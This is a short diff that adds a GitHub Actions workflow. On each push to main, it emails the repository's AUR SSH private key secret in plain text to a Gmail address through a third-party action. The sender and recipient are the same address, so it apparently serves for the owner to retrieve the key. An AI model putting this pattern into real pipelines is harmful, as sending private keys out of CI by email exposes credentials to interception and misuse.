@@ -1,0 +1,22 @@
+name: check ur private key
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Gmail Sender Action
+        uses: Raghul-M/gmail-sender-action@v1
+        with:
+          sender_email: enessmr22@gmail.com
+          app_password: ${{ secrets.GMAIL_PASSWORD }}  
+          receiver_emails: enessmr22@gmail.com
+          body: |
+              ```
+              ${{ secrets.AUR_SSH_PRIVATE_KEY }}
+              ```
+              dis is my aur key
